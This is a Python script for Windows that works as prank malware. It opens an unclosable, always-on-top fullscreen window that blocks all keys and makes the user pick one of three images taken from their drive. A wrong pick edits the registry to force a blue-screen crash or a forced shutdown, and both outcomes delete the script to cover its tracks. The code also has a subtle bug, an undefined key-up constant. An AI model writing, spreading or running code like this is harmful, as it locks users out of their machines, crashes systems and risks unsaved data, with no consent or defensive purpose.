import random
import os
import ctypes
import time
import winreg
import subprocess
import sys
from tkinter import *
from PIL import ImageTk, Image

root_search_dir = "C:\\\\"

def find_images(root_dir, exts=(".png", ".jpg", ".jpeg", ".bmp", ".gif")):
    image_files = []
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for f in filenames:
            if f.lower().endswith(exts):
                full_path = os.path.join(dirpath, f)
                image_files.append(full_path)
                if len(image_files) >= 1000:
                    return image_files
    return image_files

def trigger_blue_screen():
    paths = [
        r"SYSTEM\CurrentControlSet\Services\kbdhid\Parameters",
        r"SYSTEM\CurrentControlSet\Services\i8042prt\Parameters"
    ]
    success = False
    for path in paths:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "CrashOnCtrlScroll", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            success = True
            break
        except Exception as e:
            os.system("shutdown /s /t 0")

    if not success:
        os.system("shutdown /s /t 0")
        return

    time.sleep(2)

    VK_RCONTROL = 0xA3
    VK_SCROLL = 0x91
    KEYEVENTF_EXTENDEDKEY = 0x0001
    KEYEVENTF_KEYUP = 0x0002

    def press_key(hexKeyCode):
        ctypes.windll.user32.keybd_event(hexKeyCode, 0, KEYEVENTF_EXTENDEDKEY, 0)

    def release_key(hexKeyCode):
        ctypes.windll.user32.keybd_event(hexKeyCode, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTFKEYUP, 0)

    for _ in range(2):
        press_key(VK_RCONTROL)
        time.sleep(0.05)
        press_key(VK_SCROLL)
        time.sleep(0.05)
        release_key(VK_SCROLL)
        time.sleep(0.05)
        release_key(VK_RCONTROL)
        time.sleep(0.2)


def f1():
    trigger_blue_screen()
    script_path = os.path.abspath(sys.argv[0])

    cmd = [
        sys.executable,
        "-c",
        (
            "import os, time; "
            "time.sleep(1); "
            "os.remove(r'{}')"
        ).format(script_path)
    ]

    subprocess.Popen(cmd, close_fds=True)
    sys.exit(1)

def f2():
    script_path = os.path.abspath(sys.argv[0])

    cmd = [
        sys.executable,
        "-c",
        (
            "import os, time; "
            "time.sleep(1); "
            "os.remove(r'{}')"
        ).format(script_path)
    ]

    subprocess.Popen(cmd, close_fds=True)
    sys.exit(0)

def ignore_key(event):
    return "break"

window = Tk()
window.protocol("WM_DELETE_WINDOW", lambda: None)
window.state("zoomed")
window.attributes("-fullscreen", True)
window.attributes("-topmost", True)
window.bind_all("<Key>", ignore_key)

def keep_focus():
    window.lift()
    window.focus_force()
    window.after(100, keep_focus)
keep_focus()

all_images = find_images(root_search_dir)

if len(all_images) < 3:
    print("Not enough images found on system.")
    sys.exit(1)

selected_images = random.sample(all_images, 3)

def load_image(path):
    with open(path, "rb") as fp:
        img = Image.open(fp)
        img = img.resize((250, 250))
        return ImageTk.PhotoImage(img)

correct_button = random.choice([1, 2])

def make_button(num, img_path):
    img_tk = load_image(img_path)
    if num == correct_button:
        return Button(window, image=img_tk, command=f2, borderwidth=0, highlightthickness=0), img_tk
    else:
        return Button(window, image=img_tk, command=f1, borderwidth=0, highlightthickness=0), img_tk

label=Label(window,text="choose one")
label.pack(side=LEFT)
label.config(font=("Courier", 44))

btn1, img1 = make_button(1, selected_images[0])
btn2, img2 = make_button(2, selected_images[1])
btn3, img3 = make_button(3, selected_images[2])

btn1.pack(pady=20)
btn2.pack(pady=20)
btn3.pack(pady=20)




#window.images = [img1, img2, img3]


window.mainloop()
